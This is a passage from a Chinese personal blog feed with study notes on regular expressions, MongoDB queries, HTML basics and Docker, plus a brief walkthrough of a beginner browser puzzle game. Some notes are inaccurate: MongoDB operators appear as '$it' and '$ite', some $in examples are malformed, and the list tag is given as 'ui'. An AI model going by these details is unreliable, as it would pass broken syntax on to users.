    <content type="html"><![CDATA[<h1>python核心编程</h1><center><small>2019-10-01</small></center>新的月份开始，也开始准备新的目标。<center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 正则表达式</b></h3><p><b>1. 简介</b><br>我不是很理解作为一本编程的进阶书目，把正则表达式放在第一章的意义是什么。但是在多数场合下正则表达式又是一种非常有效的手段，在进行字符串搜索和处理能够起到奇效。由此，将正则表达式(regex)作为第一章的开端也无可厚非。<br>正则表达式是是一种高级的文本模式匹配、抽取、与/或文本形式的基础。它能够按照某种模式匹配一系列有相似特征的字符串。使字符串的操作更佳高效。</p><p>放一个我学习的目录地址：<a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">http://deerchao.net/tutorials/regex/regex.htm</a></p><table><thead><tr><th>符号</th><th>说明</th><th>举例(正则/匹配字符串)</th></tr></thead><tbody><tr><td>dvk</td><td>(纯粹输入想要匹配的完整字符串)匹配字符串'dvk'</td><td>dvk/dvk</td></tr><tr><td>.</td><td>可以匹配除了换行符以外的任意字符(除\n之外)</td><td>b.b / 任意形式的如bab\bbb\bcb...</td></tr><tr><td>'^'</td><td>匹配字符串的开始</td><td>^Dear / 开头是Dear的字符串</td></tr><tr><td>'$'</td><td>匹配字符串的结束</td><td>/bin/*sh$ / 结尾是/bin/*sh的字符串</td></tr><tr><td>*</td><td>'*'可以0次或多次匹配</td><td>[A-Za-z0-9]* /任意长度的大写、小写、数字的字符串</td></tr><tr><td>+</td><td>'+'可以匹配重复一次或是更多次</td><td>[a-z]+.com / 简单的.com域名匹配</td></tr><tr><td>?</td><td>匹配0次或者1次</td><td>goo? /匹配goo或go</td></tr><tr><td>\b</td><td>代表一个单词的开头或是结尾。</td><td>\bthe / 以the开头的字符串</td></tr><tr><td>\w</td><td>代表数字、字母或是下划线或汉字</td><td></td></tr><tr><td>\d</td><td>表示数字;\d{2}表示\d必须连续匹配两次。</td><td></td></tr><tr><td>\s</td><td>匹配任意的空白符</td><td></td></tr><tr><td>''</td><td>转义字符,可以表示字符串中出现的元字符</td><td></td></tr><tr><td>'()'</td><td>优先级运算</td><td></td></tr></tbody></table><p>反义：大写\W</p><p><b>1.2. 字符类:</b></p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>[]</td><td>限定匹配范围。例如:[0-9]表示只能是0至9这十个数字中的一个。反义:[^]</td></tr><tr><td>''</td><td>分支条件</td></tr><tr><td>(epx)</td><td>匹配epx并捕获epx并放到默认分组中</td></tr><tr><td>(?'name'epx)</td><td>匹配epx并捕获epx放到自己命名的分组</td></tr><tr><td>(?:exp)</td><td>匹配exp,不捕获匹配的文本，也不给此分组分配组号</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;python核心编程&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-10-01&lt;/small&gt;&lt;/center&gt;
新的月份开始，也开始准备新的目标。
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/center&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;b&gt;0x00- - </summary>
      
    
    
    
    <category term="Language" scheme="http://blog.dvkunion.cn/categories/Language/"/>
    
    
    <category term="Python3" scheme="http://blog.dvkunion.cn/tags/Python3/"/>
    
  </entry>
  
  <entry>
    <title>mongodb</title>
    <link href="http://blog.dvkunion.cn/2019/08/10/mongodb/"/>
    <id>http://blog.dvkunion.cn/2019/08/10/mongodb/</id>
    <published>2019-08-10T14:06:31.000Z</published>
    <updated>2022-01-05T05:43:55.938Z</updated>
    
    <content type="html"><![CDATA[<h1>Mongodb</h1><center><small>2019-08-10</small></center><p>Nice (๑•̀ㅂ•́)و✧ 上一篇前端文章还没写完，我又厚颜无耻的搞新东西了。<br>(っ<em>´Д`)っ 但是我真的真的，需要一个数据库支持，不然工具的开发性能这一块一直会卡着我。<br>(っ</em>´Д`)っ 三天打鱼两天晒网。</p><center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 简介</b></h3><p>又是日常的简介哈哈哈....(强颜欢笑╮(╯__╰)╭)要去看数据库这一块真的是因为最近在搞开发玩，所以从开发的角度遇到了一系列的问题。在之后的工作和渗透中也能起到很好的帮助。</p><p>因为任何信息总归需要一个存储，当数量级上来了之后简单的写成一个文件已经不能满足增删改查在速度和性能等方面的需求，以及数据存储所需要的空间。这种时候就显现出数据库的强大了。</p><p>关于数据库的选择上，我也纠结了很久。。。不用win了access和sqlserver我就直接pass掉了，oracle又不免费<del>(其实就是懒得去搞)</del>，mysql和mariadb....emmmm安装费劲然后可转移性我也不太喜欢。。。最后考虑的就是postgresql、mongodb、redis这几个了。</p><p>首先 postgresql 之前搞msf时候看过几下。。。总觉得接受不了postgresql的布局逻辑。。。不能理解他的内部。py的支持上也没搞好。。。</p><p>然后是redis，这个听老师讲都是用来做一些缓存之类的，存储数据的数量级非常有限，实际意义上不太作用于数据存储这一块。咱也不知道最后功能和数据要扩展到多少。。。反正先得往大了整吧。。。</p><p>所以综上，就有了这篇文章的由来。</p><p>然后接触了mongodb之后感觉，嗯，真香。<br>果然这种简单粗暴 概念不抽象且易懂的才是好数据库。(呲牙)</p><p>那么mongodb是一个什么东西呢？他较其他的数据库有哪些优点和特性呢？</p><p>首先mongodb是由 <b><u>C++ </u></b> 编写，照xx百科的话：<b><u>是非关系数据库当中功能最丰富，最像关系数据库的。</u></b><br>mongodb介于关系数据库和非关系数据库之间，支持的数据结构类似于json、bson。</p><p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。字段值可以包含其他文档，数组及文档数组。</p><p>以下为概念性知识点：<del>(概念好讨厌啊复制粘贴下好了)</del></p><p>关系型数据库遵循的ACID规则：A (Atomicity) 原子性、C (Consistency) 一致性、I (Isolation) 独立性、D (Durability) 持久性。</p><p>分布式计算的优点：可靠性、可扩展性、资源共享、灵活性、更快的速度、更高的性能</p><p>NoSQL:指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p><p>CAP定理 :布鲁尔定理（Brewer's theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:</p><pre><code>一致性(Consistency) (所有节点在同一时间具有相同的数据)可用性(Availability) (保证每个请求不管成功或者失败都有响应)分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作)</code></pre><p>因此将NoSQL数据库可分为：</p><pre><code>CA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。CP - 满足一致性，分区容忍性的系统，通常性能不是特别高。AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。</code></pre><p>BASE：是NoSQL数据库通常对可用性及一致性的弱要求原则:</p><pre><code>Basically Availble --基本可用Soft-state --软状态/柔性事务。 &quot;Soft state&quot; 可以理解为&quot;无连接&quot;的, 而 &quot;Hard state&quot; 是&quot;面向连接&quot;的Eventual Consistency -- 最终一致性， 也是是 ACID 的最终目的。</code></pre><h3><b>0x01- - 常用基本操作</b></h3><p>安装过程跳过 此部分只记录几个重点，具体分散在每一个小结内：</p><ul><li>· mongodb默认端口号：27017</li><li>· mongodb默认数据路径：/data/db/</li><li>· mongodb配置文件：/etc/mongod.conf</li></ul><p>然后借用菜鸟 <a href="https://www.runoob.com" target="_blank" rel="noopener">https://www.runoob.com</a> 的一张表，详细的对应了关系数据库内的一些定义和mongodb内的一些名词的映射：</p><table><thead><tr><th>SQL术语/概念</th><th>MongoDB术语/概念</th><th>解释/说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表/集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行/文档</td></tr><tr><td>column</td><td>field</td><td>数据字段/域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接,MongoDB不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键,MongoDB自动将_id字段设置为主键 /名称 / 含义</td></tr></tbody></table><p>之后列出一些常用语句：</p><p>列出数据库: <code>&gt; show dbs</code><br>列出当前数据库: <code>&gt; db</code><br>创建/切换数据库：<code>&gt; use admin</code><br>默认存在的三个数据库: <code>admin config local</code><br>删除数据库 ：<code>&gt; db.dropDatabase()</code></p><p>创建集合：<code>&gt; db.createCollection(name,options)</code>  name为集合名，options为选项。如：&amp;#123capped:true,size:10&amp;#125<br>查看集合：<code>&gt; show collections</code><br>删除集合：<code>&gt; db.(collections_name).drop()</code></p><p>插入数据：<code>&gt; db.(collections_name).insert(document)</code><br>查找数据：<code>&gt; db.(collections_name).find()</code><br>更新数据：<code>&gt; db.(collections_name).update(query update multi:boolen)</code>   query 相当于where update相当于 set<br>只更新数据的一个值：<code>&gt; db.(collections_name).update(query $set:update multi:boolen)</code><br>保存：<code>&gt; db.(collections_name).save(document)</code><br>删除：<code>&gt; db.(collections_name).remove(query update justOne:boolen)</code></p><h3><b>0x02- - 集合</b></h3><p>在mongodb中，没有表的概念，所有的表都叫做集合(Collections)。这个也比较好理解，因为mongodb中的数据都是以文档(Document)的形式进行存储，文档内的数据并不是统一的，所以不能够用表格来存储，而是用集合概念来代替。</p><p><b>创建</b><br>创建集合：<code>&gt; db.createCollection(name,options)</code>  name为集合名，options为选项。如：&amp;#123autoIndexId:true,capped:true,size:10&amp;#125</p><p>在mongodb的控制台中，你也可以不创建集合直接去添加一个文档，mongodb会自动创建这个集合。<br><code>&gt; db.mytest.insert(&amp;#123&quot;name&quot;:&quot;test&quot;&amp;#125)</code><br><code>&gt; show collections</code><br><code>mytest</code></p><p><b>删除</b><br>删除集合：<code>&gt; db.(collections_name).drop()</code></p><p><b>查看</b></p><p>查看所有集合：<code>&gt; show collections</code></p><p><b>Size</b><br>size属性可以限制这个集合的大小，一般和capped属性同时使用，达到的效果为：当这个集合存储的文档达到设置的size大小时，再向该集合插入数据时，会从最早的文档开始覆盖存储。</p><p>要设置size属性，要在创建集合的时候配置options属性：</p><p><code>&gt; db.createCollection('test',&amp;#123capped:true,size:10&amp;#125)</code></p><h3><b>0x03- - 查询</b></h3><p>论数据库的基础操作，无非就是增删改查四个方面。增删改的操作在第一部分简单的带过了一下，那么作为最常用的查询功能，查询的方法也是多种多样，所以将查询作为单独的一个模块进行记录。</p><p><b>find</b><br>find 是最为常用的查询功能，其语法为：</p><p><code>&gt; db.collection.find(query, projection)</code></p><p>query是要搜索的条件，同样是以json的形式。如:&amp;#123&quot;name&quot;:&quot;test&quot;&amp;#125,则搜索集合内所有name键值为test的文档。</p><p>projection意为投影，当启用该模块时，可以指定查询结果输出想要的键值。</p><p><b>pretty</b></p><p>pretty方法连在查找方式的结尾，使输出结果更加美观。</p><p><code>&gt; db.collection.find().pretty()</code></p><p><b>findOne</b></p><p>findOne方法会返回查找到的第一条结果，注意findOne的O大写。</p><p><code>&gt; db.collection.findOne()</code></p><p><b>比较运算符</b></p><p>在mongodb的查找中，可以使用比较运算符进行条件查找，相当于mysql中的where。</p><table><thead><tr><th>比较运算符</th><th>MongoDB</th><th>解释/说明</th></tr></thead><tbody><tr><td>等于</td><td>&amp;#123key:value&amp;#125</td><td>mongodb中默认键值对为等于概念</td></tr><tr><td>小于</td><td>$it</td><td>db.collection.find(&amp;#123'age':&amp;#123$it:18&amp;#125&amp;#125)</td></tr><tr><td>小于或等于</td><td>$ite</td><td>db.collection.find(&amp;#123'age':&amp;#123$ite:18&amp;#125&amp;#125)</td></tr><tr><td>大于</td><td>$gt</td><td>db.collection.find(&amp;#123'age':&amp;#123$gt:18&amp;#125&amp;#125)</td></tr><tr><td>大于或等于</td><td>$gte</td><td>db.collection.find(&amp;#123'age':&amp;#123$gte:18&amp;#125&amp;#125)</td></tr><tr><td>不等于</td><td>$ne</td><td>db.collection.find(&amp;#123'age':&amp;#123$ne:18&amp;#125&amp;#125)</td></tr></tbody></table><p><b>逻辑运算符</b></p><p>同样在mongodb的查找中，可以使用逻辑运算符进行条件查找，相当于mysql中的and/or。</p><table><thead><tr><th>逻辑运算符</th><th>MongoDB</th><th>解释/说明</th></tr></thead><tbody><tr><td>and</td><td>,</td><td>db.collection.find(&amp;#123'name':'test','age':18&amp;#125)</td></tr><tr><td>or</td><td>$or:[]</td><td>db.collection.find(&amp;#123$or:[&amp;#123'age':18&amp;#125,&amp;#123'name':'test'&amp;#125]&amp;#125)</td></tr></tbody></table><p><b>范围运算符</b></p><p>范围运算符可以将查询条件限制在一个范围之内。</p><table><thead><tr><th>范围运算符</th><th>MongoDB</th><th>解释/说明</th></tr></thead><tbody><tr><td>在范围内</td><td>$in</td><td>db.collection.find(&amp;#123'age':&amp;#123$in:&amp;#123[18,28]&amp;#125) (查询18岁<b>和</b>28岁)</td></tr><tr><td>不在范围内</td><td>$nin</td><td>db.collection.find(&amp;#123'age':&amp;#123$nin:&amp;#123[18,28]&amp;#125)</td></tr></tbody></table><p><b>正则表达式查询</b></p><p>mongodb支持使用正则表达式进行限制查询，使用// 或者 $regex来使用正则表达式：</p><p><code>db.collection.find(&amp;#123'age':'/^\d/'&amp;#125)</code><br><code>db.collection.find(&amp;#123'age':&amp;#123$regex:'^\d'&amp;#125&amp;#125)</code></p><p><b>自定义查询</b></p><p>mongodb支持使用自定义函数进行查询限制，函数的语法同js语法。</p><p><code>db.collection.find(&amp;#123$where:function()&amp;#123return this.age&gt;18&amp;#125)</code></p><p><b>limit和skip</b></p><p>limit 方法同sql语句中的limit一样，限制输出结果的数量。如：</p><p><code>db.collection.find().limit(2)</code></p><p>表示限制两条数据输出。</p><p>skip方法也一样，表示跳过n条数据进行输出。如：</p><p><code>db.collection.find().skip(2)</code></p><p>则表示输出第三条结果。</p><p>limit和skip可以同时使用，如：</p><p><code>db.collection.find().limit(2).skip(1)</code></p><p>表示输出第2、3条结果。</p><p><b>projection-投影</b></p><p>这个在一开始说find方法的时候提到了，作为find方法的可选参数，投影可以配置查找结果中输出哪些需要的数据，如：</p><p><code>db.collection.find(&amp;#123&amp;#125,&amp;#123_id:0,name:1&amp;#125)</code></p><p>这样就取消了默认的id输出，并且只输出name参数。</p><p><b>sort-排序</b></p><p>排序方法可以将查询结果的输出序列化，其语法为：</p><p><code>db.collection.find().sort(&amp;#123key:1,....&amp;#125)</code></p><p>其中key为需要排序的字段，参数1代表升序排序，-1代表降序排序。同时支持多个key进行排序，排序的循序按照key的先后进行。如：</p><p><code>db.collection.find().sort(&amp;#123'name':1,'age':-1&amp;#125)</code></p><p>表示先按照名字的升序排序，当名字相同时按照age的降序排序。</p><p><b>count-统计</b></p><p>count方法可以统计查询到符合的结果个数，其语法为：</p><p><code>db.collection.find().count()</code></p><p>也可以直接省略find：</p><p><code>db.collection.count(&amp;#123&amp;#125)</code></p><p><b>distinct-去重</b></p><p>distinct方法可以对数据进行去重，其语法为:</p><p>``db.collection.distinct('gender',&amp;#123'age':18&amp;#125)`</p><p>表示输出所有年龄等于18的数据的所有gender存在的值。</p><h3><b>0x04- - 高级操作</b></h3><p><b>聚合</b></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Mongodb&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-08-10&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;Nice (๑•̀ㅂ•́)و✧ 上一篇前端文章还没写完，我又厚颜无耻的搞新东西了。&lt;br&gt;
(っ&lt;em&gt;´Д`)っ 但是我真的真的，需要一个数据库支持，不</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="数据库" scheme="http://blog.dvkunion.cn/tags/数据库/"/>
    
  </entry>
  
  <entry>
    <title>前端基础</title>
    <link href="http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"/>
    <id>http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2019-07-22T15:43:22.000Z</published>
    <updated>2022-01-05T12:27:04.678Z</updated>
    
    <content type="html"><![CDATA[<h1>前端基础</h1><center><small>2019-07-22</small></center>感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。把全栈的知识补一补。  <center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 简介</b></h3><p>说到前端，想到的无非就是三个兄弟：HTML CSS JavaScript。<br>所以就按照顺序把这三个兄弟都熟悉一遍，相对来讲Html和CSS会简单一些，重点在Js上多下一些功夫。</p><h3><b>0x01- - HTML</b></h3><p>Html又被称作超文本标记语言，是我们在构造web网页的一种基础的标准语言。浏览器会将其解析成我们所看到的网页格式。<br>在接触过Markdown语法之后，其实感觉HTML语言是和其十分类似的。不同的是作为标记的标签在html中是成对出现的，是一种标记标签 (markup tag)。</p><p>HTML还有一个兄弟叫做HTML5。emmm一开始也分不清这两个东西，类似于python2 和python3的感觉吧，h5的语法和声明上和html略有不同，增加了很多人性化的标签。可以看作是一个更新的版本吧。</p><p><b>声明</b><br><code>&lt;!DOCTYPE html&gt;</code><br>一般在.htm .html文件的开头，总会有这样一句。用于声明该文件为html5文件。<br>不同版本的html语言所用的声明有所不同。</p><p><code>&lt;html&gt;&lt;/html&gt;</code><br>这对标签声明了html页面的主体部分，展示html的根元素。</p><p><code>&lt;head&gt; &lt;/head&gt;</code><br>head标签声明了html头部分，描述文档的数据内容。</p><p><code>&lt;body&gt; &lt;/body&gt;</code><br>body标签声明了html内容的主体部分，展示所呈现给浏览器可视化的部分。</p><p>这几部分的声明就可以构造出一个简单的标准html页面，例如我们写出一个hello world的页面：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;            &lt;title&gt; Hello Html &lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;Hello world &lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>保存为html格式后直接用浏览器打开即可看到我们的第一个html页面。</p><p><b>元素</b></p><p><code>&lt;title&gt; &lt;/title&gt;</code><br>title是页面的标题，显示在浏览器的工具栏处</p><p><code>&lt;base&gt; &lt;/base&gt;</code><br>base标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接</p><p><code>&lt;link&gt; &lt;/link&gt;</code><br>link标签常用于资源引用，例如css样式</p><pre><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;xxx.css&quot;&gt;</code></pre><p><code>&lt;style&gt; &lt;/style&gt;</code><br>样式标签</p><p><code>&lt;meta&gt;</code><br>meta标签描述了一些基本的元数据。</p><pre><code>&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre><p><code>&lt;script&gt; &lt;/script&gt;</code><br>表示js脚本的标签</p><p><code>&lt;hn&gt; &lt;/hn&gt;</code><br>h标签是html标题，一共有6个等级，1-6代表不同等级的标签。</p><p><code>&lt;p&gt; &lt;/p&gt;</code><br>p标签表示这是一个段落</p><p><code>&lt;a&gt; &lt;/a&gt;</code><br>a标签表示这是一个超链接</p><p><code>&lt;img src&gt;</code><br>img标签表示这是一个图片</p><p><code>&lt;hr&gt;</code><br>这个标签表示是一个水平线</p><p><code>&lt;br&gt;</code><br>换行符标签</p><p><code>&lt;b&gt; &lt;em&gt; &lt;i&gt; &lt;small&gt; &lt;strong&gt; &lt;sub&gt; &lt;sup&gt; &lt;ins&gt; &lt;del&gt;</code><br>文字类标签，表示加粗、着重、斜体、小号字体、加重语气、上下标、插入、删除</p><p><code>&lt;code&gt; &lt;q&gt;</code><br>这几类不常使用的标签，表示代码、引用（非常少见）</p><p><code>&lt;table&gt; &lt;th&gt;&lt;/th&gt;&lt;td&gt; &lt;tr&gt; &lt;/tr&gt; &lt;/td&gt; &lt;/table&gt;</code><br>表格标签</p><p><code>&lt;ui&gt;&lt;li&gt;&lt;/li&gt;&lt;ui&gt;</code><br>列表标签 ui表示无序，ol表示有序</p><p><code>&lt;div&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt;</code><br>容器标签，可以将各种元素放入其中组成一个容器，拥有同样的样式和属性。<br>div多用于整体，span多用于文本。</p><p><code>&lt;form&gt;&lt;/form&gt;</code><br>表单元素，用于装载用户输入内容。</p><p><code>&lt;iframe&gt;&lt;/iframe&gt;</code><br>表示窗口框，可在一个页面上显示多个窗口。</p><p><b>属性</b></p><p>元素在其标签内可以拥有不同的属性，来进行进一步的功能或格式的美化</p><p><code>&lt;a id=&gt;</code><br>id属性表示一个书签标记，在一个html页面中id应该为唯一的。可用于跳转和定位等。</p><p><code>&lt;a href=&gt;</code><br>href属性表示链接的url</p><p><code>&lt;a target=&gt;</code><br>使用target=_blank可以实现在新的窗口打开页面。</p><p><code>&lt;img alr=&gt;</code><br>alt 属性用来为图像定义一串预备的可替换的文本。当图片无法加载的时候作为备用替换上去</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;前端基础&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-07-22&lt;/small&gt;&lt;/center&gt;
感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。
把全栈的知识补一补。  
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/smal</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="前端" scheme="http://blog.dvkunion.cn/tags/前端/"/>
    
  </entry>
  
  <entry>
    <title>Programmer-game</title>
    <link href="http://blog.dvkunion.cn/2019/06/14/Programmer-game/"/>
    <id>http://blog.dvkunion.cn/2019/06/14/Programmer-game/</id>
    <published>2019-06-14T03:38:35.000Z</published>
    <updated>2022-01-05T05:43:55.934Z</updated>
    
    <content type="html"><![CDATA[<h1>Programmer-game</h1><h3><b>0x00- - 前言</b></h3><p>偶然间找到的一个小游戏，当娱乐做一做。</p><h3><b>0x01- - level 1</b></h3><p><b>Level 1-0</b><br>console控制台发现不正常的hello world，提交及可。</p><p><b>Level 1-1</b><br>依旧是console控制台，base64解码提交即可。</p><p><b>Level 1-2</b><br>又是console控制台，base64解码，提示ping 一个网址，拿到ip提交即可。</p><p><b>Level 1-3</b><br>好了控制台没东西了。F12看源码发现存在一个隐形的透明元素，直接获得密码123456<br>过关的密码是：密码是123456,这块卡住了。日。</p><p><b>Level 1-4</b><br>又回到控制台了，这次是16进制编码转ascii码即可。</p><p><b>Level 1-5</b><br>一个大写的# 观察发现是rgb格式指定，专程16进制格式#2f4584 即可</p><p><b>Level 1-6</b><br>base64 的图片，在线转换成png得到数字密码。</p><p><b>Level 1-7</b><br>有一张坏了的图片，查看链接发现是一个html页面。访问即可得到密码。</p><p><b>Level 1-8</b><br>base64代码，找了一圈解出来的十六进制怎么转换，最后发现console自带了getpassword方法。。。<br>然后发现，，，原来level.html下存在每一关的js。。。所有东西都直接能看到。</p><p><b>Level 1-9</b><br>一张图片，php源码。<br>好的看了半天沙雕代码。<br>最后是隐写。。。hex查看最后<br>判断一下运行输出的结果。就是密码。。。</p><h3><b>0x02- - level 2</b></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Programmer-game&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;偶然间找到的一个小游戏，当娱乐做一做。&lt;/p&gt;
&lt;h3&gt;&lt;b&gt;0x01- - level 1&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;&lt;b&gt;Level 1-0&lt;/b&gt;&lt;br&gt;
conso</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://blog.dvkunion.cn/2019/06/10/Docker/"/>
    <id>http://blog.dvkunion.cn/2019/06/10/Docker/</id>
    <published>2019-06-10T12:57:11.000Z</published>
    <updated>2022-01-05T05:43:55.921Z</updated>
    
    <content type="html"><![CDATA[<h1>Docker</h1><hr><center><small>2018-12-26</small></center>(ﾟ∀。) 最近莫名的开了好几个新的文章，操作系统还没整理完密码学的编码也没继续记录完，然后我又开了一个docker......我可能是个傻子吧。<p>(((ﾟДﾟ;))) 人生好难</p><center><small>2019-5-24</small></center>经过一段时间以及换了mac pro的契机，各种环境的转换巴拉巴拉，还有最近想学习各种 vulurn hub 和复线大佬们的赛题环境，重新整理一下对docker的笔记以及自己的理解。<center><small>2019-6-10</small></center>搞来了一张图，用于考察自己的学习结果以及复习时候可以使用的思维导图<img src="https://cdn.dvkunion.cn/Docker27.png"><center><small>华丽的分割线</small></center><hr><h3><b>0x01- - docker简介</b></h3><p>首先是日行例常简介。<br>讲道理很讨厌简介这个东西，总觉得概念性的东西说起来好麻烦啊......</p><p>当时用过一阵docker之后，我个人觉得docker其实就是将所有的软件运行环境进行一个打包处理，进行一个模块化。当我们想要使用的时候，就可以像拼接积木一样，把所有我们想要的功能直接组合在一起即可，方便而快捷，同时各个容器内部之间又不会产生环境版本或冲突等问题。</p><p>然后还是放一些官方的介绍吧</p><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。Docker为开发人员和IT部门提供了构建，管理和保护业务关键型应用程序的自由，而无需担心技术或基础架构锁定，从而释放了组织的潜力。</p><p>什么是容器？容器技术是一种虚拟化的方案，它类似虚拟机技术，但又与虚拟机技术完全不同。它只能运行相同或相似内核的操作系统，依赖于Linux内核特性：Namespace和Control Groups。容器取消了虚拟机中操作系统、Hypervisor 并整合成了一个叫做docker engine 的东西。使得磁盘的占用空间大大减少、占用资源大大减少。对于一个应用不再需要几十个G的操作系统，只需要应用以及其依赖环境即可。</p><p>有一个很形象的比喻：在很久以前，运输业在一趟列车上只能运输同一种货物，例如，如果把香蕉和各种化工药物一起运输，最后药物可能被污染，香蕉也会被压烂；这时候人们做出了一个伟大的发明：集装箱，把一种货物装进一个集装箱，直接对集装箱进行运输即可，安全又方便。这个集装箱就可以看做是---容器。</p><p>Docker就是为容器提供了一个轻量级的简单建模方式，能够将应用程序部署到容器当中。为实现高内聚、低耦合做进一步的推进。使用Docker，可以轻松的隔离各个应用的运行环境，解决了在一台服务器上部署多个应用导致的冲突问题。</p><h3><b>0x02- - docker基本组成</b></h3><p>Docker一般分为三个主要部分：Image 镜像，Container 容器，Registry 仓库。</p><p>都是一些概念性的东西，说一些比较好理解的吧。这三个东西可以认为是：win下的iso文件，一个虚拟机，iso文件仓库。<br>当我们去安装一个虚拟机的时候，我们都要选择操作系统，然后倒入对应操作系统的iso镜像文件进行安装。这就类似于docker的Image 镜像；当我们安装好了之后，我们将会获得一个虚拟机，这个虚拟机运行着我们安装的操作系统，整个虚拟机就类似于docker的容器。最后仓库就很好理解了，是一个整体存放镜像文件的库，可以在里面找到你想要的各个版本的系统/环境。</p><h4><font color="blue">Image 镜像</font><br></h4><p>镜像是容器的基石，当我们运行一个docker容器时，会生成一个docker栈，<br>他的最底层是一个bootfs的引导类文件系统，类似于Linux的引导文件系统；上一层就是操作系统层rootfs，他可以是一种或者多种的操作系统：Ubuntu、CentOS，这一部分在最开始的时候以只读的方式加载，在加载完成后才会开方读写模式。再上层是docker的联合加载模式（union mount），加载多个文件系统和应用。</p><h4><font color="blue">Container 容器</font><br></h4><p>容器是镜像的执行者，所有的镜像都需要使用容器来进行执行。容器中可以运行用户的一个或者多个进程，在容器启动镜像时候，会在docker栈的最顶层生成一个读写层来给用户进行操作，所有对于镜像的读写操作都会储存在这里。这也是docker的一个特点：写时复制。</p><h4><font color="blue">Registry 仓库</font><br></h4><p>相比于前两部分，这一个可能更好理解一些。所谓仓库就是存储docker镜像文件的仓库。就像GitHub是存放代码的仓库一样。docker公司提供了一个免费的仓库docker hub，用户也可以构建属于自己的仓库。</p><h4><font color="blue">容器技术</font><br></h4><p>在简介里提到了两个比较陌生的部分：Namespaces 命名空间、Control groups 控制组。</p><p>命名空间是一种封装的概念。在操作系统中，命名空间是系统资源的隔离，如：进程、网络、文件系统等等。这也是Linux系统实现虚拟化的基础。</p><p>在docker中有五种命名空间：PID 进程隔离，NET 网络隔离， IPC 通信进程隔离，MNT 挂载点隔离，UTS 隔离内核和版本号。</p><p>控制组是用来控制分配资源的一种机制，它提供一个资源限制、优先级限定、资源计量、资源控制的服务。</p><p>通过这两中容器技术，docker就可以实现：</p><ul><li>文件系统隔离：所有容器都有root文件系统</li><li>进程隔离：所有应用都在自己的容器内运行互不干扰</li><li>网络隔离：容器之间的虚拟网络和IP是分割的</li><li>资源隔离：对宿主主机CPU和内存等资源进行合理分配</li></ul><h3><b>0x03- - docker基本操作</b></h3><p>学习docker操作，第一个一定是从一个搭建一个web服务开始。</p><p>首先我们要安装好docker。安装步骤很简单，只需要内核版本足够即可。<br>对于Ubuntu，只需要内核版本高于3.10 即可。之后获取安装脚本运行就OK。<br>对于CentOS，要求系统要在7以上。</p><p>安装完成后，我们可以启动docker服务：</p><p><code># service docker start</code></p><p>启动一个容器：<br><code># docker run IMAGENAME</code></p><p>启动交互式容器：<br><code># docker run -i -t IMAGENAME /bin/bash</code><br>-i --interactive=true 默认是FALSE 标准输入进程<br>-t --tty=true 默认是FALSE 分配终端</p><p><code># docker run --name=USERNAME -i -t IMAGENAME /bin/bash</code>  自定义容器名</p><p>查看建立的容器：<br><code># docker ps -a/-l</code>  